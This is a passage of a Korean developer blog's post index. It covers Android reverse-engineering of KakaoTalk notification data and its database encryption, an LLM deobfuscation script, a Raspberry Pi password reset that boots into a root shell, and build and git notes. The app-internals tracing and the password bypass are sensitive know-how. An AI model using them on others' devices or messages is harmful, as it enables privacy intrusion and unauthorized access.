활용할 수 있을 것이다.추후에는 llm 을 활용한 다른 확장 플러그인이나 앱을 만들어보려고 한다." }, { "title": "Android Application Research Series 3", "url": "/posts/where_is_image_url_data_on_device/", "categories": "android, research, develop", "tags": "android, research", "date": "2025-02-18 05:03:08 +0900", "snippet": "데이터 암호화 및 복호화 로직 따라가기지난번에는 사진과 영상에 대한 데이터를 확인하여 알림을 읽지 않고도 알림을 받을 시 생성되는 데이터 구조 안을 살퍄보았다.이때 url 을 통해 상대가 어떤 내용의 컨텐츠를 보냈는지 확인하는 내용을 다뤘다.이번에는 해당 데이터가 디바이스 어디에 보존되면서 어떤 경우에 어떠한 방식으로 로드되는지 따라가보려고 한다.암호...", "content": "데이터 암호화 및 복호화 로직 따라가기지난번에는 사진과 영상에 대한 데이터를 확인하여 알림을 읽지 않고도 알림을 받을 시 생성되는 데이터 구조 안을 살퍄보았다.이때 url 을 통해 상대가 어떤 내용의 컨텐츠를 보냈는지 확인하는 내용을 다뤘다.이번에는 해당 데이터가 디바이스 어디에 보존되면서 어떤 경우에 어떠한 방식으로 로드되는지 따라가보려고 한다.암호화부분아래는 그룹화된 알림을 받았을 때 데이터를 암호화하는 부분이다.123243 ms DataBaseResourceCrypto$b.b(\"{\\\"kl\\\":[\\\"redacted/redacted/redacted/redacted.jpg\\\",\\\"redacted/redacted/redacted/redacted.jpg\\\"],\\\"mtl\\\":[\\\"image/jpg\\\",\\\"image/jpg\\\"],\\\"csl\\\":[\\\"redacted\\\",\\\"redacted\\\"],\\\"wl\\\":[1080,1080],\\\"hl\\\":[553,2340],\\\"cmtl\\\":[\\\"\\\",\\\"\\\"],\\\"sl\\\":[85047,149222],\\\"imageUrls\\\":[\\\"https://talk.kakaocdn.net/redacted\\\",\\\"https://talk.kakaocdn.net/redacted\\\"],\\\"thumbnailUrls\\\":[\\\"https://talk.kakaocdn.net/redacted\\\",\\\"https://talk.kakaocdn.net/redacted\\\"],\\\"thumbnailWidths\\\":[120,56],\\\"thumbnailHeights\\\":[62,120]}\")위는 받은 데이터를 암호화하는 작업이다.아래는 받은 데이터를 암호화하여 반환하는 부분이다.123243 ms &lt;= \"ljsUhFCNTSP7v...XWcQkilvfTBe\"그룹화된 컨텐츠가 올 때 위의 메소드가 호출되는데 평문 데이터를 암호화하는 시점이다.복호화부분아래는 파일에 적재되어있는 암호화 데이터를 로드하는 부분다.432240 ms DataBaseResourceCrypto$b.a(\"ljsUhFCNTSP...vxB9XWcQkilvfTBe\")해당 메소드를 통해 데이터가 복호화되는 걸 확인할 수 있다. 실제로는 데이터 길이가 훨씬 길게 나오지만 여기서는 일부만 편집해서 사용한다.432240 ms &lt;= \"{\\\"kl\\\":[\\\"redacted/redacted/redacted/redacted.jpg\\\",\\\"redacted/redacted/redacted/redacted.jpg\\\"],\\\"mtl\\\":[\\\"image/jpg\\\",\\\"image/jpg\\\"],\\\"csl\\\":[\\\"redacted\\\",\\\"redacted\\\"],\\\"wl\\\":[1080,1080],\\\"hl\\\":[553,2340],\\\"cmtl\\\":[\\\"\\\",\\\"\\\"],\\\"sl\\\":[85047,149222],\\\"imageUrls\\\":[\\\"https://talk.kakaocdn.net/redacted\\\",\\\"https://talk.kakaocdn.net/redacted\\\"],\\\"thumbnailUrls\\\":[\\\"https://talk.kakaocdn.net/redacted\\\",\\\"https://talk.kakaocdn.net/redacted\\\"],\\\"thumbnailWidths\\\":[120,56],\\\"thumbnailHeights\\\":[62,120]}\"데이터를 복호화하면 위와 같이 나온다.ConclusionBinary file 에서 확인할 수 있는 데이터해당 파일을 탐색한 결과 일렬의 데이터가 오차도 없이 기록되어 있는 걸 발견할 수 있다.실제로 앱 내부 디레턱리에서 해당 데이터가 존재하여 파일로부터 데이터를 로드하는 걸 볼 수 있다./data/user/0/com.kakao.talk # ./search.shBinary file databases/KakaoTalk.db-wal matchesBinary file databases/KakaoTalk.db-wal matches/data/user/0/com.kakao.talk #해당 데이터가 접근하는 곳은 Application 내부라 일반 디바이스에서는 접근 문제가 발생한다. 이를 실제 확인하기 위해서는 커스텀 OS 나 특별한 환경의 디바이스에서 해당 작업을 진행하여야 한다. 다음에는 해당 로직을 좀 더 자세하게 관찰하며 로직화해보고자 한다." }, { "title": "LLM 을 활용한 분석 자동화 도구 개발", "url": "/posts/jeb_with_llm/", "categories": "llm, research", "tags": "llm, research", "date": "2025-02-17 03:24:08 +0900", "snippet": "LLM 을 통한 도구 개발오픈소스에 생성형 AI 를 활용한 자동화 도구를 만들 수 있다고 한다. 이에 나아가 현재 가장 활발하게 사용하고 있는 툴에 스크립트를 연결하여 LLM 도구를 활용해보고자 한다. 모델을 사용하기 전 API 키를 발급받아 적용해야 하는데 이 페이지에서 해당 내용은 다루지 않는다.만들고자 하는 내용은 이렇다.Deobfuscated ...", "content": "LLM 을 통한 도구 개발오픈소스에 생성형 AI 를 활용한 자동화 도구를 만들 수 있다고 한다. 이에 나아가 현재 가장 활발하게 사용하고 있는 툴에 스크립트를 연결하여 LLM 도구를 활용해보고자 한다. 모델을 사용하기 전 API 키를 발급받아 적용해야 하는데 이 페이지에서 해당 내용은 다루지 않는다.만들고자 하는 내용은 이렇다.Deobfuscated Code from LLM툴에서 제공되는 API 를 통해 디컴파일된 코드를 얻는다. 이는 난독화가 되었을 수 있고 그렇지 않을 수 있다. 이때 해당 코드를 포함하여 커스텀 프롬포트를 메세지 바디에 담아서 LLM 모델에 API Query 를 보낼 것이다.그리고 처리된 응답 메세지에서 코드 부분을 발췌하여 콘솔 창 또는 윈도우 아니면 기존 코드로부터 변경하여 적용해준다.아래와 같이 변수명이 날라가고 함수명이 날라가고 로직이 이해하기 어렵게 되었을 때 시도해보겠다.public static final java.lang.String c(java.lang.String s, java.lang.String s1) { if(!jk0.e.k(s)) { try { java.security.MessageDigest messageDigest0 = java.security.MessageDigest.getInstance(\"SHA-256\"); byte[] arr_b = s.getBytes(Qi0.a.b); kotlin.jvm.internal.m.f(arr_b, \"getBytes(...)\"); byte[] arr_b1 = messageDigest0.digest(arr_b); return s1 == null || jk0.e.k(s1) ? EQ.V0.p(arr_b1) : EQ.V0.p(arr_b1) + \".\" + s1; } catch(java.security.GeneralSecurityException unused_ex) { } } return \"\";}스크립트를 구동하여 결과를 얻으면 아래와 같다.// Original method name: cpublic static final java.lang.String hashStringWithOptionalSuffix(java.lang.String inputString, java.lang.String optionalSuffix) { // Original variable name: s if(!StringUtils.isEmpty(inputString)) { // Check if the input string is not empty try { // Original variable name: messageDigest0 java.security.MessageDigest sha256Digest = java.security.MessageDigest.getInstance(\"SHA-256\"); // Get SHA-256 MessageDigest instance // Original variable name: arr_b byte[] inputBytes = inputString.getBytes(CharsetUtils.DEFAULT_CHARSET); // Convert input string to bytes using default charset kotlin.jvm.internal.m.f(inputBytes, \"getBytes(...)\"); // Ensure the conversion to bytes is valid // Original variable name: arr_b1 byte[] hashedBytes = sha256Digest.digest(inputBytes); // Perform the SHA-256 hash computation // Original variable name: s1 return optionalSuffix == null || StringUtils.isEmpty(optionalSuffix) ? HashUtils.encodeToBase64(hashedBytes) : HashUtils.encodeToBase64(hashedBytes) + \".\" + optionalSuffix; // If optionalSuffix is null or empty, return the hash, otherwise return hash with optional suffix } catch(java.security.GeneralSecurityException exception) { // Catch security exception but do nothing } } return \"\"; // Return empty string if input string is empty}해당 스크립트를 좀 더 다듬어 자동화를 시켜보고자 한다.사용 후오히려 더 어려워지는 감이 없지 않아 있고 놓치는 부분들이 많이 보인다. 조금 시간이 걸리더라도 수동으로 하는 게 지금은 좀 더 좋아보인다. 특히 클래스 메소드를 참조한 코드를 보거나 매개변수를 유추할 때 꽤 많이 혼란을 주어 어려움이 더 커지는 경향이 있다.하지만 사용해보면서 이런 도구도 만들 수 있구나 경험도 해보았으니 이 부분으로 만족해보려고 한다. 좀 더 좋은 삶의 질을 향상할 수 있는 방안이 있다면 해당 프로젝트를 확장하거나 다른 프로젝트를 통해 개발을 진행해보려고 한다." }, { "title": "Android Application Research Series 2", "url": "/posts/how_to_preview_movie_file/", "categories": "android, research, develop", "tags": "android, research, develop", "date": "2025-02-13 03:12:15 +0900", "snippet": "안드로이드 알림에 있는 동영상 미리보기지난번에 여러 묶인 사진 미리보는 것에 이어서 영상을 미리 확인할 수 있는 방법을 재확인하였다.사실 지난번에는 불가능할 거 같았는데 다른 데이터랑 헷갈려서 착각했었다. 다시 확인해보니 영상 역시 가능해보였다.들어가기 앞서 안드로이드에서 앱이 올라올 때 바이너리 파일부터 런타임 메모리를 보면서아래 안드로이드 로드 과...", "content": "안드로이드 알림에 있는 동영상 미리보기지난번에 여러 묶인 사진 미리보는 것에 이어서 영상을 미리 확인할 수 있는 방법을 재확인하였다.사실 지난번에는 불가능할 거 같았는데 다른 데이터랑 헷갈려서 착각했었다. 다시 확인해보니 영상 역시 가능해보였다.들어가기 앞서 안드로이드에서 앱이 올라올 때 바이너리 파일부터 런타임 메모리를 보면서아래 안드로이드 로드 과정을 정리해본다. 왜냐면 기억력을 믿을 수 없기 때문에.. 그리고 나중에 또 찾아보겠지..안드로이드 앱 실행 과정 확인해보기┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐1단계: 런처 처리Launcher.startActivity()↓ActivityTaskManager.startActivity()↓ (Binder IPC, Inter-Process Communication)ActivityManagerService.startActivity()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘↓┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐2단계: 프로세스 생성Process.start()↓ZygoteProcess.start()↓Zygote.fork()↓ActivityThread.main()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘↓┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐3단계: SO 로드LoadedApk.loadLibrary()↓System.loadLibrary()↓Runtime.loadLibrary0()↓DexPathList.findLibrary()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘↓┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐4단계: DEX 로드PathClassLoader.loadClass()↓BaseDexClassLoader.loadClass()↓DexPathList.findClass()↓DexFile.loadClassBinaryName()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘↓┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐5단계: Application 생성LoadedApk.makeApplication()↓Instrumentation.newApplication()↓Application.attach()↓Application.onCreate()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘↓┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐6단계: Activity 시작ActivityThread.handleLaunchActivity()↓ActivityThread.performLaunchActivity()↓Instrumentation.newActivity()↓Activity.onCreate()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘↓┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐7단계: 뷰 렌더링Activity.setContentView()↓PhoneWindow.setContentView()↓LayoutInflater.inflate()↓ViewRootImpl.performTraversals()↓measure() → layout() → draw()└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘데이터 구조 확인이어서 본격적으로 지난번에 분석한 시점에서 이어서 동영상을 받았을 때 데이터를 확인해보겠다.동영상을 받았을 떄 데이터 구조를 보면 아래와 같다.NotificationMessage(title=redacted , message=redacted. , messageWithoutEmoticonAltText=redacted. , profileUrl=null , iconResId=0 , subText=null , ticker=redacted : 동영상을 보냈습니다. , unreadCount=3 , hasNotificationKeyword=false , quiet=false , chatLog=[class:class Tl.d0] ChatLog [id=redacted , type=redacted , chatRoomId=redacted , userId=redacted , message=video , attachment={\\\"url\\\":\\\"https://talk.kakaocdn.net/redacted/redacted/redacted/redacted/redacted.mp4?credential=redacted&amp;expires=redacted&amp;signature=redacted\\\" ,\\\"tk\\\":\\\"redacted/redacted/redacted/redacted.mp4\\\" ,\\\"cs\\\":\\\"redacted\\\" ,\\\"s\\\":redacted ,\\\"d\\\":4 ,\\\"w\\\":414 ,\\\"h\\\":720 } , createdAt=redacted , v={\\\"notDecoded\\\":false ,\\\"origin\\\":\\\"MSG\\\" ,\\\"c\\\":\\\"redacted\\\" ,\\\"modifyRevision\\\":0 ,\\\"isSingleDefaultEmoticon\\\":false ,\\\"defaultEmoticonsCount\\\":0 ,\\\"isMine\\\":false ,\\\"enc\\\":redacted } , userId=redacted , chatId=redacted , chatLogId=redacted , messageType=Video , emoticonUrl=null , emojiResId=0 , xconVersion=-1 , uri=null , notificationId=null , hasNotificationReply=false , mentioned=false , hasNotificationVoiceroom=false , isGroupChat=false , isOpenChat=false , isSecretChat=false , isInSilentChatRoom=false)attachment 부분에 링크가 있는데 해당 링크로 접근하면 아래와 같이 알림을 열어보지 않고 어떤 영상이 왔는지 확인해볼 수 있다.링크를 통해 동영상을 확인다음엔 영상도 파싱하는 부분을 진행해보려고 한다." }, { "title": "Android Application Research Series 1", "url": "/posts/how_to_work_notification/", "categories": "android, research, develop", "tags": "android, research, develop", "date": "2025-02-12 00:28:14 +0900", "snippet": "안드로이드 개발기안드로이드를 공부하고 개발하다보니 개인적으로 앱을 만들어보고 싶은 생각만 58000번은 했었다. 항상 실행은 하지 않고 생각만 했는데 근래 조금씩 일단 시작하기로 해서 먼저 도안을 그려나가고 있다. 필요한 기능들과 그리고 어떤 내부 로직을 가져야하는지 조금씩 만들어가고 있다. 기존에 몇 앱들을 만들어봤지만 만든 이도 사용하기 싫을 정도...", "content": "안드로이드 개발기안드로이드를 공부하고 개발하다보니 개인적으로 앱을 만들어보고 싶은 생각만 58000번은 했었다. 항상 실행은 하지 않고 생각만 했는데 근래 조금씩 일단 시작하기로 해서 먼저 도안을 그려나가고 있다. 필요한 기능들과 그리고 어떤 내부 로직을 가져야하는지 조금씩 만들어가고 있다. 기존에 몇 앱들을 만들어봤지만 만든 이도 사용하기 싫을 정도로 별로였다. (하지만 만든 이 만큼은 자신의 앱을 사랑하려고 노력해야 한다..) 이번에는 제대로 만들어보기 위해 탄탄한 초석을 준비하면서 만들어가고 있다. 또 필요한 기능을 GPT 에게 물어보면 만들어줄거 같았는데 계속 동문서답만 해서 한번 직접 차근차근 파보려고 한다.알림 센터에 관하여, 사실은 아니지만케이스 바이 케이스겠지만 개발하는 것도 재밌지만 누군가가 개발한 것으로 역으로 살펴보는 것 역시 가슴 뛰는 일이라고 생각한다. 이 시리즈는 꽤 짧지 않을 거 같아서 좋은 결과가 없더라도 시간이 될 때 조금씩 블로그에 기재해보려고 한다.살펴볼 것으로는 안드로이드 알림을 만들다보니 알림 센터에 메시지가 올 때 메시지를 미리 볼 수 있는데 요즘은 이모티콘이나 사진도 미리 볼 수 있어서 가끔 안읽씹에 용이하다. 하하 넝담.. 그런데 일부 메신저 앱은 보낸 이가 여러 장의 사진을 같이 묶어 보내면 알림 센터에 같이 보낸 사진들의 총 갯수가 보이면서 미리보기가 지원이 안된다. 이에 대해 어떻게 하면 미리볼 수 있는 방법이 있을까 궁금하였다.그래서 알림에서 날라오는 묶음 사진을 미리 볼 수 있는 방법이 있는지 확인해보고자 한다.먼저 보낼 때 아래와 같이 여러 개의 사진을 묶어서 보낸다.상대에게 여러 장의 사진 보내기받는 쪽에서 아래와 같이 몇 장의 사진을 받았는지 메세지 형태로만 보이는 걸 확인할 수 있다.메신저에서 메세지 형태로 확인알림센터에서도 몇 장의 사진만 받았는지 보여준다.알림 센터에서 몇 장의 사진인지만 확인살펴볼 메신저에서는 NotificationMessage 라는 클래스를 분석할 예정이다.해당 클래스 속한 dex file참고로 메신저 앱의 컴파일된 classes3.dex, classes4.dex 파일을 확인하면 NotificationMessage 관련 클래스를 확인할 수 있다.본격적으로 해당 클래스가 알림을 받을 때 형성되는 데이터 구조를 확인해보고자 한다.처음에 보낸 메세지를 받는 쪽에서 확인하면 아래와 같은 데이터 형식을 확인할 수 있다.NotificationMessage( title=dummy , message=redacted , messageWithoutEmoticonAltText=redacted , profileUrl=null , iconResId=0 , subText=null , ticker=redacted : redacted , unreadCount=14 , hasNotificationKeyword=false , quiet=false , chatLog=... , type=redacted , chatRoomId=redacted , userId=redacted , message=5 photos , attachment={..........계속 내려가다보면 중간에 아래와 같은 부분이 있다. ,\\\"thumbnailUrls\\\":[ \\\"https://talk.kakaocdn.net/redacted/redacted/redacted/redacted/redacted.jpg?credential=redacted&amp;expires=redacted&amp;signature=redacted..convert=resize&amp;w=120&amp;h=90\\\" ,\\\"https://talk.kakaocdn.net/redacted/redacted/redacted/redacted/redacted.jpg?credential=redacted&amp;expires=redacted&amp;signature=redacted..convert=resize&amp;w=90&amp;h=120\\\" ,\\\"https://talk.kakaocdn.net/redacted/redacted/redacted/redacted/redacted.jpg?credential=redacted&amp;expires=redacted&amp;signature=redacted..convert=resize&amp;w=90&amp;h=120\\\" ,\\\"https://talk.kakaocdn.net/redacted/redacted/redacted/redacted/redacted.jpg?credential=redacted&amp;expires=redacted&amp;signature=redacted..convert=resize&amp;w=90&amp;h=120\\\" ,\\\"https://talk.kakaocdn.net/redacted/redacted/redacted/redacted/redacted.jpg?credential=redacted&amp;expires=redacted&amp;signature=redacted..convert=resize&amp;w=90&amp;h=120\\\" ] ,\\\"thumbnailWidths\\\":[120,90,90,90,90],\\\"thumbnailHeights\\\":[90,120,120,120,120]} , createdAt=redacted , v=..... , userId=redacted , chatId=redacted , chatLogId=redacted , messageType=MultiPhoto , emoticonUrl=null , emojiResId=0 , xconVersion=-1 , uri=null , notificationId=null , hasNotificationReply=false , mentioned=false , hasNotificationVoiceroom=false , isGroupChat=false , isOpenChat=false , isSecretChat=false , isInSilentChatRoom=false)여기서 thumbnailUrls 부분이 있는데 이에 접근하면 아래와 같이 상대방이 보낸 사진을 메신저 cdn 링크를 통해 볼 수 있다.해당 url 을 통한 사진 확인참고로 동영상 같은 경우 thumbnailUrls 존재하는지 확인해봤지만 존재하지 않았다.url 을 조합하면 다른 사진도 볼 수 있을까 했는데 실제 url 은 암호화된 여러 해시로 감싸져 있어 쉽게 접근은 불가하게 만들어 안전해 보인다.다음에는 위 내용에 이어서 해당 정보를 실제로 파싱하는 부분을 진행해보겠다." }, { "title": "How to reset Raspberry Pi user name and password", "url": "/posts/how_to_reset_raspberry_pi_user_name_and_password/", "categories": "raspberrypi", "tags": "raspberrypi, linux", "date": "2025-01-13 22:47:43 +0900", "snippet": "라즈베리파이 계정 정보를 잃어버렸을 때Raspberry Pi 를 종종 사용하는 게 아니라 아주 가끔 사용하다보면 로그인 계정 정보를 잃어버릴 때가 많다. 자주 초기화하다보니 기록해놓은 로그인 정보조차 업데이트가 안 되어 난감할 때가 많은데 이때 구글링을 해보니 아래와 같은 방법이 있어 추후 또 같은 실수를 저지를 수 있어 기록해둔다. 먼저 S...", "content": "라즈베리파이 계정 정보를 잃어버렸을 때Raspberry Pi 를 종종 사용하는 게 아니라 아주 가끔 사용하다보면 로그인 계정 정보를 잃어버릴 때가 많다. 자주 초기화하다보니 기록해놓은 로그인 정보조차 업데이트가 안 되어 난감할 때가 많은데 이때 구글링을 해보니 아래와 같은 방법이 있어 추후 또 같은 실수를 저지를 수 있어 기록해둔다. 먼저 SD 카드를 제거하여 다른 컴퓨터에서 SD 를 삽입하여 내부에 파일을 확인한다. /boot/cmdlin.txt 를 열어서 init=/bin/sh (boot the basic shell) 를 추가해준다. 라즈베리파이에 다시 SD 카드를 삽입해서 부팅시켜준다. 쉘이 나오면 mount -o remount rw / 입력해준다. /etc/passwd 을 읽어 사용자 이름을 확인한다. passwd &lt;username&gt; 을 사용하여 새로운 비밀번호를 설정해준다. 다시 /boot/cmdlin.txt 를 열어서 원래대로 복구해주고 라즈베리파이를 리부팅한다. " }, { "title": "How to set specific gradle version and jdk for some project", "url": "/posts/how_to_set_specific_gradle_version_and_jdk_for_some_project/", "categories": "gradle, jdk", "tags": "gradle, jdk", "date": "2024-12-21 08:29:02 +0900", "snippet": "빌드되지 않은 프로젝트오픈소스 프로젝트를 빌드하는데 빌드가 되지 않아 찾아보았다. 해당 Gradle 은 Gradle 7.0 에서 deprecated 된 기능을 사용하고 있어서 Gradle 버전을 수정하고 그에 맞게 JDK 버전을 수정해야 했던 일이 있어 이에 관하여 정리하였다.아래 내용은 공홈에 나와있는 JDK 버전과 Gradle 버전 간 호환성을 나...", "content": "빌드되지 않은 프로젝트오픈소스 프로젝트를 빌드하는데 빌드가 되지 않아 찾아보았다. 해당 Gradle 은 Gradle 7.0 에서 deprecated 된 기능을 사용하고 있어서 Gradle 버전을 수정하고 그에 맞게 JDK 버전을 수정해야 했던 일이 있어 이에 관하여 정리하였다.아래 내용은 공홈에 나와있는 JDK 버전과 Gradle 버전 간 호환성을 나타낸 테이블이다.내용에 따르면 7.0 버전 아래를 쓴다면 JDK 버전은 17 미만을 써야한다.현재 환경은 Gradle 8.0 이상이 설치되어 있으며 JDk 버전은 17인 상태이다.특정 버전으로 Gradle 빌드하기distributionUrl=https\\://services.gradle.org/distributions/gradle-6.8.3-bin.zipgradle/wrapper 에서 properties 파일을 찾아서 위에 라인에 gradle 버전을 수정해주면 특정 버전으로 빌드할 수 있다.특정 JDK 버전으로 Gradle 빌드하기로컬에 설정된 JDK 버전과 별개로 특정 프로젝트에서 Gradle 빌드 시 설정하고 싶다면 아래와 같이 옵션 매개변수를 지정해주면 된다../gradlew testBuild -Dorg.gradle.java.home=/usr/lib/jvm/java-{specific-version}-jdk/-D, --system-prop Set system property of the JVM (e.g. -Dmyprop=myvalue).-D 옵션은 시스템 속성을 설정하도록 도와주는 옵션으로 위와 같이 JDK 버전을 명시해서 빌드할 수 있다." }, { "title": "Developed Android analysis tool for executable file", "url": "/posts/research_android_analysis_tool/", "categories": "android, research", "tags": "research, android", "date": "2024-12-19 22:56:15 +0900", "snippet": "IntroMethod info internal class sectionYou can view the data, flags, instance fields, and direct methods within a class as strings.시증에 이미 강력한 툴들이 나와있지만 개인적인 용도로 사용해보거나 원리를 이해하기 위해 만들어보는 것도 좋다고 생각하여...", "content": "IntroMethod info internal class sectionYou can view the data, flags, instance fields, and direct methods within a class as strings.시증에 이미 강력한 툴들이 나와있지만 개인적인 용도로 사용해보거나 원리를 이해하기 위해 만들어보는 것도 좋다고 생각하여 이번에 기존 프로젝트 위에 기능을 추가해보았다.apk 파일을 drag 하면 파일 내에 있는 n 번째 파일까지 읽는데 이때 처리하는 로직을 java application 에서 처리하지 않고 native low 단에서 처리하도록 기능을 추가했다.근래에는 dex file 을 패킹하고 보안 처리하여 apk 안에 100 ~ 200개 있는 앱들도 있어서 종종 기성툴들에서 디컴파일 타임아웃이 일어나기도 한다.이를 수동으로 하나씩 볼 수 있게 이러한 기능을 만들어보았다.FeatureAndroid Analysis tool file info (like parser)You can check the count of methods, fields, and class nodes, as well as verify the offsets of the class, field, and method indices.기능은 간단하게 파일 내에 있는 Method, Field, Class 등등 갯수를 확인할 수 있으며 개발 단계에서 어떤 코드가 내포되었는지 확인할 수 있다.이 다음에는 apk 내에 있는 다른 파일 형식도 확인해보고자 한다. 추후 고도화해볼 수 있다면 다른 기능들도 해볼 수 있을 것으로 생각한다. 지금은 고칠 부분이 많이 보인다." }, { "title": "개발 환경 구축할 때 사용하는 명령어들", "url": "/posts/linux_cmd_about_enviroment/", "categories": "linux, command", "tags": "linux, command", "date": "2024-12-07 23:11:00 +0900", "snippet": "환경 구축할 때 사용하는 유용한 명령어에 관하여여러가지 개발툴을 설치하거나 많은 툴을 사용할 때 이곳저곳에 흩어진 툴들을 찾아가서 실행하기엔 번거로울 때가 많다.윈도우로 치면 바로가기 아이콘을 만들거나 단축 명령어를 만들거나 할 수 있다. 이를 위해 몇가지 확인하면서 알게 된 명령어를 정리해놓으려고 한다.리눅스에서 안드로이드 스튜디오를 설치하면 실행할...", "content": "환경 구축할 때 사용하는 유용한 명령어에 관하여여러가지 개발툴을 설치하거나 많은 툴을 사용할 때 이곳저곳에 흩어진 툴들을 찾아가서 실행하기엔 번거로울 때가 많다.윈도우로 치면 바로가기 아이콘을 만들거나 단축 명령어를 만들거나 할 수 있다. 이를 위해 몇가지 확인하면서 알게 된 명령어를 정리해놓으려고 한다.리눅스에서 안드로이드 스튜디오를 설치하면 실행할 때 설치된 디렉터리까지 가서 studio.sh 를 실행해야 한다.또한 그 외 비공식적인 툴 같은 경우 경로까지 가서 실행 스크립트를 실행시켜야 하는 경우가 많다.이때 아래 명령어들을 이용해서 환경을 구축하면 용이한 것 같다.alias긴 명령어를 짧게 만들고 싶을 때. 자주 쓰는 명령어를 효율적으로 실행하고 싶을 때 특정 명령어나 명령어 조합에 별칭(단축키)을 지정할 수 있다.alias ls='ls --color=auto'alias ll='ls -la'export환경 변수(예: PATH, JAVA_HOME, PYTHONPATH)를 설정해야 할 때.쉘에서 실행되는 스크립트나 프로그램이 특정 변수를 참조하도록 해야 할 때, 쉘 단에서 사용할 수 있는 변수를 설정하거나, 자식 프로세스에서도 환경 변수를 사용할 수 있도록 전달한다.export PATH=$PATH:/root/tools/jadx/build/jadx/binroot@test ~ % jadxjadx jadx-gui jadx-gui.bat jadx.batsource쉘 스크립트나 설정 파일을 다시 적용해야 할 때, 새로 추가된 환경 변수를 즉시 반영하고 싶을 때, 쉘 스크립트 파일을 현재 쉘 세션에서 실행하거나, 환경 변수나 설정 값을 갱신한다.$ source ~/.bashrc아래와 같이 사용할 수 있다.$ . ~/.bashrc정리하며위와 같은 명령어들을 살펴보았는데 여러가지 툴을 효과적으로 빠르게 실행시키기엔 좋을 것으로 보인다." }, { "title": "Upgrade Blog core to v7.2.0 (feat. merge conflict)", "url": "/posts/upgrade_to_core_v7.2.0/", "categories": "git, blog", "tags": "blog, git", "date": "2024-12-02 15:01:34 +0900", "snippet": "블로그 코어 업데이트하기얼마 전 블로그 코어를 업그레이드에 대한 내용은 해당 게시글에서 확인할 수 있다. 얼마 지나지 않아 새로운 버전이 릴리즈되어 이전과 같은 불상사를 막고자 미리 병합을 시도하여 따라가고자 한다.최신 태그를 기반으로 그러니까 현재 블로그 코어에 반영되지 않은 최신 업스트림 릴리즈 태그를 기반으로 병합할 브랜치를 만들어주고서 병합할 ...", "content": "블로그 코어 업데이트하기얼마 전 블로그 코어를 업그레이드에 대한 내용은 해당 게시글에서 확인할 수 있다. 얼마 지나지 않아 새로운 버전이 릴리즈되어 이전과 같은 불상사를 막고자 미리 병합을 시도하여 따라가고자 한다.최신 태그를 기반으로 그러니까 현재 블로그 코어에 반영되지 않은 최신 업스트림 릴리즈 태그를 기반으로 병합할 브랜치를 만들어주고서 병합할 준비를 시작한다.$ git merge next # next 는 upstream 의 v7.2.0 을 기반으로 추적하는 브랜치이다.해당 명령어를 실행했을 때 자동 병합이 되지 않고 충돌이 난다면 블로그 코어 파일들을 수정했을 경우가 높다. git 은 어떤 파일이 병합 실패했는지 알려주고 하나하나 수정 후 커밋해줘야 한다.CONFLICT (modify/delete): .github/workflows/cd.yml deleted in HEAD and modified in next. Version next of .github/workflows/cd.yml left in tree.CONFLICT (modify/delete): .github/workflows/ci.yml deleted in HEAD and modified in next. Version next of .github/workflows/ci.yml left in tree.CONFLICT (modify/delete): .github/workflows/commitlint.yml deleted in HEAD and modified in next. Version next of .github/workflows/commitlint.yml left in tree.CONFLICT (modify/delete): .github/workflows/publish.yml deleted in HEAD and modified in next. Version next of .github/workflows/publish.yml left in tree.CONFLICT (modify/delete): .github/workflows/stale.yml deleted in HEAD and modified in next. Version next of .github/workflows/stale.yml left in tree.자동 병합: .gitignore충돌 (내용): .gitignore에 병합 충돌자동 병합: _includes/head.html자동 병합: _javascript/categories.js충돌 (내용): _javascript/categories.js에 병합 충돌자동 병합: _javascript/misc.js충돌 (내용): _javascript/misc.js에 병합 충돌자동 병합: _javascript/modules/components.js충돌 (내용): _javascript/modules/components.js에 병합 충돌자동 병합: _layouts/default.html자동 병합: _layouts/home.html자동 병합: _layouts/post.htmlCONFLICT (modify/delete): _posts/2019-08-09-getting-started.md deleted in HEAD and modified in next. Version next of _posts/2019-08-09-getting-started.md left in tree.CONFLICT (modify/delete): _sass/addon/commons.scss deleted in next and modified in HEAD. Version HEAD of _sass/addon/commons.scss left in tree.자동 병합: _sass/pages/_post.scssCONFLICT (file location): _sass/colors/dark-syntax.scss added in HEAD inside a directory that was renamed in next, suggesting it should perhaps be moved to _sass/themes/dark-syntax.scss.CONFLICT (file location): _sass/colors/dark-typography.scss added in HEAD inside a directory that was renamed in next, suggesting it should perhaps be moved to _sass/themes/dark-typography.scss.CONFLICT (file location): _sass/colors/light-syntax.scss added in HEAD inside a directory that was renamed in next, suggesting it should perhaps be moved to 